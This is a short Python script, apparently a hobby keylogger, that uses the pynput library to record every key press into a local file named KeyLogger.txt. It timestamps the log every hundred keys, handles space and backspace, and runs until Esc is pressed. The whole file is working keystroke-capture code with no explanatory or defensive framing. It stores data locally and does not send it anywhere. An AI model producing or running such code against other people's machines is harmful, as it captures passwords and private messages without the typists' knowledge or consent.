import pynput, datetime, os
from pynput.keyboard import Key, Listener
count=0
def write_file(key):
    global count
    count=count+1
    date=datetime.datetime.now()
    date=str(date)
    with open("KeyLogger.txt","a") as f: 
        if count>=100:
            f.write(f"\n'{date}'\n")
            count=0  
        if str(key)[0:3]=="Key": 
            if str(key)=="Key.space":
                    f.write(" ")
            elif str(key)[0:13]=="Key.backspace":
                with open("KeyLogger.txt","rb+") as ff:
                    ff.seek(-1, os.SEEK_END)
                    ff.truncate()                 
            else:               
                f.write("\n\n"+str(key)+"\n\n")   
        else:
            key=str(key).replace("'","")
            f.write(str(key))  
def on_press(key):
    write_file(key)

def on_release(key):
    if key==Key.esc:
    	print("Done....")
    	return False
print("Listening....")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

